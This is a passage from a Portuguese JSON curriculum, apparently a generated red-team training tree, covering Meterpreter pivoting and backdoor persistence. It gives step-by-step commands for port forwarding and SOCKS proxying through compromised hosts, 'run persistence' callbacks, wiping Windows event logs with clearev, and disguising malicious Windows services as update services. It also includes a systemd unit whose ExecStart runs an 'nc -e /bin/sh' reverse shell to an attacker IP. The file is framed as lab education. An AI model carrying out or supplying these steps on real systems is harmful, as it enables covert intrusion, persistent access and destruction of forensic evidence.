                                  ],
                                  "verification": "Porta listada em 'portfwd list' e acessível via netcat ou browser no host atacante.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Sessão Meterpreter ativa",
                                    "Netcat (nc)",
                                    "Browser ou curl"
                                  ],
                                  "tips": "Escolha portas livres no host local; use -i para interfaces específicas se necessário.",
                                  "learningObjective": "Dominar sintaxe e execução de portfwd local para redirecionar tráfego através de pivot.",
                                  "commonMistakes": [
                                    "Porta local já em uso",
                                    "IP remoto incorreto ou inacessível do pivot",
                                    "Esquecer de especificar protocolo TCP/UDP com -t/-u"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Port Forwarding Remoto (RPORT)",
                                  "subSteps": [
                                    "Execute 'portfwd add -R -l 9090 -p 22 -r <IP_atacante>' para forward reverso (ex: remote 9090 -> atacante SSH 22).",
                                    "Verifique com 'portfwd list' e confirme que o forward remoto está ativo.",
                                    "Do host atacante, teste acesso à porta remota forwardada (ex: ssh user@localhost:9090).",
                                    "Monitore tráfego no pivot com 'netstat' no Meterpreter para validar redirecionamento.",
                                    "Adicione múltiplos forwards se necessário para cenários complexos."
                                  ],
                                  "verification": "Forward remoto listado e serviço acessível do atacante via porta forwardada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Sessão Meterpreter",
                                    "SSH server no host atacante",
                                    "Netcat para testes"
                                  ],
                                  "tips": "Flag -R cria listener no lado remoto; ideal para exfiltração ou callbacks.",
                                  "learningObjective": "Implementar portfwd reverso para acessar serviços do atacante através do pivot.",
                                  "commonMistakes": [
                                    "Confundir sintaxe local vs remoto",
                                    "Firewall bloqueando portas remotas",
                                    "Não testar bidirecionalidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar com Nmap e Netcat e Realizar Cleanup",
                                  "subSteps": [
                                    "Execute nmap scan no host atacante: 'nmap -p 8080,9090 localhost' para verificar portas abertas.",
                                    "Use netcat para testes avançados: 'nc localhost 8080' e envie dados para validar redirecionamento.",
                                    "Scan de portas forwardadas: 'nmap -sV -p 80 --script http-title localhost:8080'.",
                                    "Liste todos forwards com 'portfwd list', delete com 'portfwd delete -l <porta> -r <IP>' ou 'portfwd flush'.",
                                    "Verifique cleanup com 'netstat -tuln' no pivot e atacante."
                                  ],
                                  "verification": "Nmap detecta portas/services corretamente; todos forwards removidos sem vazamentos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Nmap",
                                    "Netcat (nc)"
                                  ],
                                  "tips": "Combine com --script para validação profunda; sempre cleanup para evitar detecção.",
                                  "learningObjective": "Validar funcionalidade de pivoting e limpar artefatos para ops stealth.",
                                  "commonMistakes": [
                                    "Scanar portas erradas",
                                    "Esquecer cleanup expondo portas",
                                    "Interpretar falsos positivos em nmap"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest interno, comprometa um servidor web (pivot) e use portfwd local para acessar um DB server interno (porta 1433) via localhost:1433 no seu Kali, permitindo dump de dados sem firewall rules.",
                              "finalVerifications": [
                                "Portfwd local e remoto configurados e listados corretamente.",
                                "Acessibilidade validada com nc e nmap mostrando services forwardados.",
                                "Cleanup completo sem portas residuais.",
                                "Logs de tráfego confirmam redirecionamento bidirecional.",
                                "Sessão pivot permanece estável pós-operações.",
                                "Documentação de comandos executados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe portfwd (local vs remoto).",
                                "Validação completa com ferramentas (nmap, nc).",
                                "Gerenciamento seguro (list/delete/flush).",
                                "Tempo de execução dentro do estimado.",
                                "Identificação e correção de erros comuns.",
                                "Explicação clara do fluxo de tráfego."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de NAT, tunneling e roteamento.",
                                "Programação: Scripts Ruby em msf para automação portfwd.",
                                "Segurança: Integração com evasão de IDS/IPS.",
                                "Sistemas Operacionais: Gerenciamento de portas e netstat em Linux/Windows."
                              ],
                              "realWorldApplication": "Durante Red Team ops, pivotar através de compromissos iniciais para alcançar assets profundos em redes segmentadas, como C2 reverso ou lateral movement em AD."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.3.2",
                            "name": "Configurar Proxy SOCKS4a/5 para Pivoting",
                            "description": "Ativação de socks proxy no Meterpreter, configuração no Proxychains ou msfconsole para escanear e explorar redes internas via pivot.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Ativar o Handler SOCKS no Meterpreter",
                                  "subSteps": [
                                    "Obtenha uma sessão Meterpreter ativa em uma máquina comprometida.",
                                    "Execute o comando 'background' para backgroundar a sessão se necessário.",
                                    "Use 'use auxiliary/server/socks_proxy' no msfconsole para iniciar o proxy.",
                                    "Configure LHOST e LPORT (ex: LPORT 1080).",
                                    "Execute 'run' ou 'exploit' para iniciar o SOCKS proxy."
                                  ],
                                  "verification": "Verifique com 'sessions -v' ou netstat se a porta 1080 está escutando e associada ao msfconsole.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Metasploit Framework instalado",
                                    "Sessão Meterpreter ativa",
                                    "Acesso root/admin na vítima"
                                  ],
                                  "tips": "Use SOCKS4a para suporte a DNS remoto; SOCKS5 para autenticação se necessário.",
                                  "learningObjective": "Entender como iniciar um proxy SOCKS reverso via Meterpreter para tunelamento.",
                                  "commonMistakes": [
                                    "Esquecer de backgroundar a sessão",
                                    "Porta já em uso",
                                    "Não configurar LHOST corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Proxychains para Usar o Proxy SOCKS",
                                  "subSteps": [
                                    "Edite o arquivo /etc/proxychains.conf ou ~/.proxychains/proxychains.conf.",
                                    "Adicione ou descomente a linha 'socks5 127.0.0.1 1080' no final da seção [ProxyList].",
                                    "Salve o arquivo e teste com 'proxychains nmap -h' para validar sintaxe.",
                                    "Ajuste para SOCKS4a se necessário alterando para 'socks4a 127.0.0.1 1080'.",
                                    "Reinicie qualquer terminal para carregar as mudanças."
                                  ],
                                  "verification": "Execute 'proxychains whoami' e confirme que trafega pelo proxy sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Proxychains instalado (apt install proxychains)",
                                    "Editor de texto como nano/vim"
                                  ],
                                  "tips": "Use socks5 para mais features; teste conectividade com 'proxychains curl ifconfig.me'.",
                                  "learningObjective": "Configurar ferramentas locais para rotear tráfego via proxy SOCKS do Metasploit.",
                                  "commonMistakes": [
                                    "ProxyList mal formatado",
                                    "Usar IP errado (deve ser 127.0.0.1)",
                                    "Não reiniciar terminal"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar msfconsole para Pivoting via SOCKS",
                                  "subSteps": [
                                    "No msfconsole, defina 'set Proxies socks5:127.0.0.1:1080' globalmente.",
                                    "Ou use 'set Proxychains true' para módulos que suportam.",
                                    "Selecione um módulo como auxiliary/scanner/portscan/tcp.",
                                    "Defina RHOSTS para IPs da rede interna pivotada.",
                                    "Execute o módulo e monitore o tráfego."
                                  ],
                                  "verification": "Confira logs do msfconsole para tráfego roteado via SOCKS e resultados de scan.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "msfconsole rodando",
                                    "Proxy SOCKS ativo"
                                  ],
                                  "tips": "Use 'Proxies' em vez de Proxychains para módulos nativos; teste com ping ou nmap primeiro.",
                                  "learningObjective": "Integrar proxy SOCKS diretamente no workflow do Metasploit para pivoting.",
                                  "commonMistakes": [
                                    "Sintaxe errada em Proxies",
                                    "Módulo sem suporte a proxy",
                                    "RHOSTS incorretos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar o Pivoting",
                                  "subSteps": [
                                    "Use proxychains nmap -sT -Pn 10.10.10.0/24 para scan da rede interna.",
                                    "No msfconsole, escaneie portas ou execute exploits via proxy.",
                                    "Monitore tráfego com Wireshark ou tcpdump filtrando porta 1080.",
                                    "Verifique acessibilidade de hosts internos não visíveis diretamente.",
                                    "Documente resultados e pare o proxy com 'jobs -K'."
                                  ],
                                  "verification": "Hosts internos respondem a scans/exploits; tráfego roteado confirmado via logs/netstat.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Wireshark/tcpdump",
                                    "Rede lab para teste"
                                  ],
                                  "tips": "Inclua --top-ports 100 no nmap para scans rápidos; evite ruído excessivo.",
                                  "learningObjective": "Validar eficácia do pivoting SOCKS em cenários reais de pentest.",
                                  "commonMistakes": [
                                    "Firewall bloqueando proxy",
                                    "DNS resolution falhando (use SOCKS4a)",
                                    "Scan ruidoso detectado"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab DVWA, comprometa a máquina web (192.168.1.100) com Meterpreter. Ative SOCKS5 na porta 1080. Use proxychains nmap para mapear a rede interna 10.0.0.0/24, descobrindo um DB server em 10.0.0.50:3306. Pivote para exploitá-lo via msfconsole.",
                              "finalVerifications": [
                                "Proxy SOCKS ativo e escutando na porta configurada sem erros.",
                                "Proxychains roteia tráfego corretamente para ferramentas externas.",
                                "Módulos msfconsole executam scans/exploits via pivot sem falhas de conectividade.",
                                "Hosts internos são acessíveis e respondem via proxy.",
                                "Logs confirmam tráfego tunelado sem vazamentos diretos.",
                                "Proxy pode ser parado limpo sem sessões órfãs."
                              ],
                              "assessmentCriteria": [
                                "Configuração precisa do SOCKS proxy no Meterpreter sem erros de sintaxe.",
                                "Integração bem-sucedida com Proxychains e msfconsole.",
                                "Validação efetiva com scans e monitoramento de tráfego.",
                                "Eficiência temporal dentro dos estimates.",
                                "Documentação clara de comandos e resultados.",
                                "Identificação e mitigação de erros comuns."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de tunelamento SOCKS e roteamento.",
                                "Sistemas Operacionais: Configuração Linux (proxychains.conf).",
                                "Programação: Scripts para automação de pivots em Python/Ruby.",
                                "Ética e Direito: Aplicação em pentests autorizados vs. uso malicioso.",
                                "Análise de Malware: Persistência via proxies em C2."
                              ],
                              "realWorldApplication": "Em engajamentos de Red Team, pentests internos ou CTFs, permite acesso a segmentos isolados de rede (ex: DMZ para LAN interna), simulando ataques APT para avaliação de defesas segmentadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.3.3",
                            "name": "Persistência e Limpeza em Sessões de Pivoting",
                            "description": "Integração de persistência com meterpreter payloads via run persistence, monitoramento de sessões e cleanup com clearev para evitar detecção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Persistência com Meterpreter Payloads",
                                  "subSteps": [
                                    "Acesse a sessão Meterpreter ativa no pivô.",
                                    "Execute o comando 'run persistence -U -i 10 -p 4444 -r <IP_atacante>'.",
                                    "Verifique se o script de persistência foi criado em %WINDIR%\\Temp\\.",
                                    "Confirme o registro no Run key do Windows Registry.",
                                    "Teste o reinício da máquina alvo para validar reconexão automática."
                                  ],
                                  "verification": "Sessão reconecta automaticamente após reinício da máquina alvo; confirme com 'sessions -l'.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Metasploit Framework ativo",
                                    "Sessão Meterpreter estabelecida",
                                    "Máquina alvo Windows vulnerável em lab",
                                    "Documentação Meterpreter persistence module"
                                  ],
                                  "tips": "Use -X para startup automática e ajuste intervalos para evitar sobrecarga de rede.",
                                  "learningObjective": "Dominar a criação de backdoors persistentes via Meterpreter para manter acesso em pivôs.",
                                  "commonMistakes": [
                                    "Esquecer de especificar IP atacante correto",
                                    "Não testar após reinício",
                                    "Payload incompatível com arquitetura da alvo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar e Gerenciar Sessões de Pivoting",
                                  "subSteps": [
                                    "Liste sessões ativas com 'sessions -l' no msfconsole.",
                                    "Use 'sessions -K' para matar sessões mortas e 'sessions -R' para renomear.",
                                    "Configure backgrounding com Ctrl+Z e interaja com 'sessions -i <ID>'.",
                                    "Monitore tráfego com 'portfwd' para pivoting adicional.",
                                    "Registre logs de sessões com 'setg LogLevel 3'."
                                  ],
                                  "verification": "Todas sessões ativas listadas corretamente; interaja sem erros e visualize logs.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "msfconsole com múltiplas sessões",
                                    "Ferramentas de monitoramento como Wireshark (opcional)",
                                    "Script de automação para session management"
                                  ],
                                  "tips": "Mantenha sessões em background para multitarefa eficiente durante operações.",
                                  "learningObjective": "Habilitar gerenciamento proativo de múltiplas sessões para operações de pivoting sustentadas.",
                                  "commonMistakes": [
                                    "Não backgroundar sessões levando a perda de controle",
                                    "Ignorar sessões mortas consumindo recursos",
                                    "Falhar em renomear sessões para rastreamento"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Limpeza de Evidências com Clearev",
                                  "subSteps": [
                                    "Na sessão Meterpreter, execute 'clearev' para limpar Event Logs do Windows.",
                                    "Verifique logs remanescentes com 'getsystem' se necessário para privilégios elevados.",
                                    "Limpe arquivos temporários relacionados ao payload com 'rm /path/to/file'.",
                                    "Delete entradas de registry criadas pela persistência manualmente se requerido.",
                                    "Confirme ausência de logs com ferramentas nativas como eventvwr."
                                  ],
                                  "verification": "Event Viewer mostra logs vazios ou resetados; sem evidências de atividade Meterpreter.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Sessão Meterpreter com privilégios",
                                    "Máquina alvo Windows",
                                    "Lista de artefatos comuns de Meterpreter"
                                  ],
                                  "tips": "Execute clearev múltiplas vezes se logs persistirem; combine com 'cleansvc' para serviços.",
                                  "learningObjective": "Aplicar técnicas de cleanup para minimizar detecção pós-operação de pivoting.",
                                  "commonMistakes": [
                                    "Executar sem privilégios SYSTEM",
                                    "Esquecer logs de outros viewers como Security/Application",
                                    "Não verificar cleanup efetivo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Persistência e Eficácia da Limpeza",
                                  "subSteps": [
                                    "Reinicie a máquina alvo e monitore reconexão da sessão.",
                                    "Inspecione Event Logs manualmente para ausência de entradas suspeitas.",
                                    "Teste detecção com ferramentas como Sysmon ou AV básico no lab.",
                                    "Documente métricas: tempo de reconexão, logs restantes.",
                                    "Ajuste configurações se persistência falhar ou detecção ocorrer."
                                  ],
                                  "verification": "Sessão persiste pós-reboot sem logs detectáveis; testes de AV passam.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ambiente lab com AV/Sysmon",
                                    "Scripts de teste de reinício",
                                    "Ferramentas de análise forense como Volatility (opcional)"
                                  ],
                                  "tips": "Use VMs snapshot para testes repetíveis e rollback rápido.",
                                  "learningObjective": "Avaliar integralmente a robustez da persistência e stealth da limpeza em cenários reais.",
                                  "commonMistakes": [
                                    "Não reiniciar corretamente",
                                    "Ignorar detecções parciais",
                                    "Falta de documentação para iterações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, após pivotar para um servidor interno via Meterpreter, execute 'run persistence' para sobreviver reboots planejados, monitore 5 sessões simultâneas durante lateral movement, e finalize com 'clearev' antes de exfiltração, garantindo zero logs no Event Viewer para simular operação stealth.",
                              "finalVerifications": [
                                "Sessão reconecta em <5 minutos pós-reboot.",
                                "Nenhum log de Meterpreter no Event Viewer (System/Security/Application).",
                                "Todas sessões gerenciadas sem crashes no msfconsole.",
                                "AV básico não detecta payload persistente.",
                                "Tráfego de C2 não levanta alertas em monitoramento de rede lab.",
                                "Documentação completa de comandos executados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de 'run persistence' com parâmetros corretos (100%).",
                                "Gerenciamento eficaz de sessões sem perda de controle (90% uptime).",
                                "Limpeza completa comprovada por inspeção de logs (zero artefatos).",
                                "Persistência validada em pelo menos 3 ciclos de reboot.",
                                "Tempo total dentro de 2 horas com zero erros críticos.",
                                "Relatório inclui screenshots de verificações."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de port forwarding e tráfego C2.",
                                "Sistemas Operacionais: Manipulação de Registry e Event Logs no Windows.",
                                "Programação: Scripting em Ruby para automação Meterpreter.",
                                "Análise Forense: Conhecimento de artefatos para evasão de detecção."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou Incident Response, mantém acesso stealth em redes corporativas durante assessments de penetração, permitindo exploração prolongada sem alertar SOCs, e cleanup essencial para compliance com regras de engagement éticas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.4",
                    "name": "Métodos de Persistência via Backdoors",
                    "description": "Técnicas para criar backdoors que garantem acesso contínuo ao sistema alvo.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.4.1",
                        "name": "Backdoors em Serviços do Sistema",
                        "description": "Técnicas para implantar backdoors como serviços persistentes no Windows ou systemd no Linux, garantindo execução automática após reinicializações.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.1.1",
                            "name": "Criação de Serviço Persistente no Windows",
                            "description": "Utilizar comandos como sc create para registrar um binário malicioso como serviço no Windows, configurando parâmetros de inicialização automática e ocultação para evitar detecção inicial.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Executável Payload e Ambiente",
                                  "subSteps": [
                                    "Obtenha ou crie um executável payload simples (ex: usando msfvenom para simulação em lab).",
                                    "Configure uma VM Windows isolada com privilégios administrativos.",
                                    "Coloque o payload em um diretório acessível, como C:\\Windows\\Temp\\payload.exe.",
                                    "Teste manualmente o payload para confirmar execução silenciosa.",
                                    "Documente o hash MD5/SHA256 do payload para verificação posterior."
                                  ],
                                  "verification": "Executar o payload manualmente via cmd e confirmar saída esperada (ex: beacon ou log).",
                                  "estimatedTime": "20 minutos",
                                  "materials": "VM Windows 10/11, Metasploit ou payload.exe simulado, calculadora de hash (certutil).",
                                  "tips": "Use payloads que não causem alertas visíveis; teste em sandbox primeiro.",
                                  "learningObjective": "Entender como preparar payloads persistentes sem detecção inicial.",
                                  "commonMistakes": "Executar sem privilégios admin; usar payloads reais em ambientes não isolados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Registrar o Serviço com sc create",
                                  "subSteps": [
                                    "Abra cmd como administrador.",
                                    "Execute: sc create NomeServico binPath= \"C:\\Windows\\Temp\\payload.exe\" type= own start= auto.",
                                    "Verifique criação com 'sc query NomeServico'.",
                                    "Ajuste displayname para algo benigno: sc config NomeServico DisplayName= \"Windows Update Service\".",
                                    "Defina descrição: sc description NomeServico \"Sistema de atualização automática\"."
                                  ],
                                  "verification": "Comando 'sc query NomeServico' retorna STATE: STOPPED ou RUNNING.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Prompt de cmd com privilégios admin, payload.exe preparado.",
                                  "tips": "Use nomes de serviços comuns para mimetismo; evite aspas desnecessárias no binPath.",
                                  "learningObjective": "Dominar o comando sc create para instalação de serviços personalizados.",
                                  "commonMistakes": "Esquecer aspas no binPath com espaços; nome de serviço inválido (máx 256 chars)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Inicialização Automática e Dependências",
                                  "subSteps": [
                                    "Configure start= auto: sc config NomeServico start= auto.",
                                    "Inicie o serviço: sc start NomeServico.",
                                    "Adicione argumentos ocultos se necessário: sc config NomeServico binPath= \"C:\\Windows\\Temp\\payload.exe -silent\".",
                                    "Desative logging excessivo: Use regedit para modificar ImagePath se avançado.",
                                    "Teste reinício do serviço: sc stop NomeServico && sc start NomeServico."
                                  ],
                                  "verification": "Serviço inicia automaticamente após reboot simulado (shutdown /r /t 0).",
                                  "estimatedTime": "15 minutos",
                                  "materials": "cmd admin, services.msc para inspeção visual.",
                                  "tips": "start= auto garante boot-time execution; teste em VM para reboot rápido.",
                                  "learningObjective": "Configurar serviços para execução persistente no boot.",
                                  "commonMistakes": "Não especificar type= own para executáveis standalone; ignorar dependências de sistema."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ocultar o Serviço e Verificar Persistência",
                                  "subSteps": [
                                    "Renomeie para mimetizar serviços legítimos (ex: 'spoolsv').",
                                    "Use sc sdset para permissões restritas: sc sdset NomeServico D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU).",
                                    "Monitore com Process Explorer ou Autoruns para confirmação.",
                                    "Simule detecção: Procure por anomalias em services.msc.",
                                    "Planeje remoção: sc delete NomeServico."
                                  ],
                                  "verification": "Serviço persiste após reboot e não aparece em scans básicos (ex: autoruns sem highlight).",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Sysinternals Suite (Autoruns, Process Explorer), services.msc.",
                                  "tips": "Combine com registry run keys para redundância; use VMs snapshot para reversão.",
                                  "learningObjective": "Aplicar técnicas de evasão para persistência stealth.",
                                  "commonMistakes": "Serviço visível em GUI; permissões padrão permitem deleção fácil."
                                }
                              ],
                              "practicalExample": "Em um lab de pentest, crie um serviço 'SysMaintenance' com binPath=\"C:\\Temp\\beacon.exe -h attacker_ip\", configurado para auto-start. Após reboot da VM, confirme C2 callback sem alertas AV iniciais.",
                              "finalVerifications": [
                                "Serviço listado em services.msc com status Running e Startup Type: Automatic.",
                                "Persistência confirmada após reboot: sc query retorna ativo.",
                                "Payload executa sem console visível ou logs óbvios no Event Viewer.",
                                "Não detectado por scans básicos de Autoruns ou Task Manager.",
                                "Hash do processo em execução matches o payload original.",
                                "Remoção possível via sc delete sem resquícios."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos comandos sc create/config/start (sem erros de sintaxe).",
                                "Configuração correta de start= auto e binPath com argumentos.",
                                "Evidência de ocultação (nome/displayname benigno, permissões restritas).",
                                "Verificação de persistência pós-reboot com screenshots/logs.",
                                "Identificação e mitigação de 3+ erros comuns demonstrados.",
                                "Documentação completa do processo e limpeza final."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de serviços Windows (SCM).",
                                "Programação: Desenvolvimento de Windows Services em C++/C#.",
                                "Análise de Malware: Detecção de persistência via Autoruns/Sysmon.",
                                "Redes: Integração com C2 frameworks como Cobalt Strike.",
                                "Defesa Cibernética: Blue Team hunting de serviços rogue."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante jogos de guerra cibernética, essa técnica simula APT persistence para testar defesas de detecção de anomalias em serviços, permitindo avaliação de EDRs como CrowdStrike ou Windows Defender ATP em cenários realistas de breach."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.1.2",
                            "name": "Implantação de Serviço via Systemd no Linux",
                            "description": "Criar arquivos de unidade systemd personalizados para executar backdoors como serviços daemon, editando /etc/systemd/system/ e recarregando o daemon para persistência.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Planejar a Estrutura do Arquivo de Unidade Systemd",
                                  "subSteps": [
                                    "Estude a documentação oficial do systemd sobre arquivos de unidade (man systemd.unit e man systemd.service).",
                                    "Identifique seções obrigatórias: [Unit], [Service] e [Install].",
                                    "Defina o comando de execução do backdoor (ex: um script Python para shell reverso).",
                                    "Planeje caminhos: arquivo em /etc/systemd/system/nome.service e binário do backdoor em /usr/local/bin/.",
                                    "Considere configurações de segurança como NoNewPrivileges=yes e ProtectSystem=strict."
                                  ],
                                  "verification": "Crie um esboço textual do arquivo .service com todas as seções principais anotadas.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação systemd (online ou man pages)",
                                    "Editor de texto como vim/nano",
                                    "Ambiente Linux virtual (ex: Ubuntu VM)"
                                  ],
                                  "tips": "Use 'systemd-analyze verify' mais tarde para validar a sintaxe; comece com um template simples.",
                                  "learningObjective": "Compreender a anatomia de um arquivo de unidade systemd para serviços personalizados.",
                                  "commonMistakes": [
                                    "Ignorar seções [Install] levando a falha no 'enable'",
                                    "Não definir Type=simple para scripts simples",
                                    "Esquecer WantedBy=multi-user.target"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar e Editar o Arquivo de Unidade Personalizado",
                                  "subSteps": [
                                    "Crie o diretório se necessário: sudo mkdir -p /etc/systemd/system/.",
                                    "Crie o arquivo: sudo nano /etc/systemd/system/backdoor.service.",
                                    "Preencha [Unit]: Description=Backdoor Service, After=network.target.",
                                    "Preencha [Service]: ExecStart=/usr/local/bin/backdoor.py, Restart=always, User=root.",
                                    "Preencha [Install]: WantedBy=multi-user.target.",
                                    "Salve e defina permissões: sudo chmod 644 /etc/systemd/system/backdoor.service."
                                  ],
                                  "verification": "Execute 'systemd-analyze verify /etc/systemd/system/backdoor.service' sem erros.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Editor de texto com root (sudo nano/vim)",
                                    "Script de backdoor de teste (ex: Python netcat wrapper)"
                                  ],
                                  "tips": "Teste o ExecStart manualmente com 'sudo /usr/local/bin/backdoor.py' antes de prosseguir.",
                                  "learningObjective": "Construir um arquivo .service funcional e seguro para daemonizar um backdoor.",
                                  "commonMistakes": [
                                    "Caminhos absolutos incorretos no ExecStart",
                                    "Falta de Restart= para persistência",
                                    "Permissões erradas causando falha no daemon"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Recarregar Daemon, Habilitar e Iniciar o Serviço",
                                  "subSteps": [
                                    "Recarregue o systemd: sudo systemctl daemon-reload.",
                                    "Habilite o serviço para boot: sudo systemctl enable backdoor.service.",
                                    "Inicie o serviço: sudo systemctl start backdoor.service.",
                                    "Verifique status: sudo systemctl status backdoor.service.",
                                    "Monitore logs: journalctl -u backdoor.service -f."
                                  ],
                                  "verification": "'sudo systemctl is-enabled backdoor.service' retorna 'enabled' e status mostra 'active (running)' sem erros.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Acesso root no terminal Linux",
                                    "Ferramentas journalctl e systemctl"
                                  ],
                                  "tips": "Use 'daemon-reload' sempre após editar arquivos .service para evitar restarts desnecessários.",
                                  "learningObjective": "Gerenciar o ciclo de vida de um serviço systemd para garantir persistência.",
                                  "commonMistakes": [
                                    "Esquecer daemon-reload causando 'Unit not found'",
                                    "Iniciar sem enable perdendo persistência no reboot",
                                    "Ignorar logs revelando falhas de ExecStart"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar Persistência e Configurações de Segurança",
                                  "subSteps": [
                                    "Reinicie o sistema: sudo reboot.",
                                    "Após boot, verifique: sudo systemctl status backdoor.service.",
                                    "Teste conectividade do backdoor (ex: netcat listener no atacante).",
                                    "Adicione hardening: PrivateTmp=yes, ProtectHome=yes no [Service].",
                                    "Atualize e re-teste: daemon-reload, restart."
                                  ],
                                  "verification": "Serviço ativo pós-reboot com logs confirmando execução e conexão estabelecida.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Máquina vítima e atacante para teste de backdoor",
                                    "Netcat ou similar para listener"
                                  ],
                                  "tips": "Sempre teste em ambiente isolado (VM) para evitar exposição real.",
                                  "learningObjective": "Validar persistência e aplicar melhores práticas de segurança em serviços maliciosos.",
                                  "commonMistakes": [
                                    "Testar sem reboot assumindo persistência",
                                    "Expor portas desnecessariamente",
                                    "Não hardening permitindo detecção fácil"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um serviço 'persistence.service' que executa 'nc -e /bin/sh attacker_ip 4444' como ExecStart=/bin/bash -c 'nc -e /bin/sh 192.168.1.100 4444', habilite-o e confirme shell reverso pós-reboot em uma VM Ubuntu.",
                              "finalVerifications": [
                                "Arquivo .service existe em /etc/systemd/system/ com sintaxe válida via systemd-analyze verify.",
                                "Serviço enabled e active após daemon-reload e start.",
                                "Persistência confirmada: ativo após reboot.",
                                "Logs journalctl mostram execução sem erros.",
                                "Conexão de backdoor estabelecida com listener externo.",
                                "Hardening aplicado sem quebrar funcionalidade."
                              ],
                              "assessmentCriteria": [
                                "Arquivo .service completo com todas seções e ExecStart funcional (20%).",
                                "Comandos systemctl executados corretamente sem erros (25%).",
                                "Persistência comprovada pós-reboot (25%).",
                                "Logs analisados e hardening implementado (15%).",
                                "Exemplo prático de backdoor rodando como daemon (15%)."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento avançado de serviços Linux.",
                                "Programação: Scripts Python/Bash para payloads de backdoor.",
                                "Redes: Conceitos de shell reverso e listeners (netcat).",
                                "Segurança: Detecção de persistência via anomaly em serviços.",
                                "DevOps: Automatização de deployments com systemd."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Ethical Hacking, implantar backdoors persistentes em alvos comprometidos para manter acesso durante defesas ativas, simulando APTs em exercícios de jogos de guerra cibernética."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.1.3",
                            "name": "Ocultação de Serviços Maliciosos",
                            "description": "Modificar nomes e descrições de serviços para mimetizar processos legítimos, usando ferramentas como PowerShell ou nsudo para evasão de monitoramento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Serviços Legítimos para Mimetismo",
                                  "subSteps": [
                                    "Liste todos os serviços do sistema usando comandos como 'Get-Service' no PowerShell ou 'sc query' no CMD.",
                                    "Analise nomes, descrições e caminhos executáveis de serviços comuns como 'Spooler', 'Themes' ou 'Wuauserv'.",
                                    "Selecione um serviço legítimo com baixa suspeita e anote seu nome original, display name e descrição exata.",
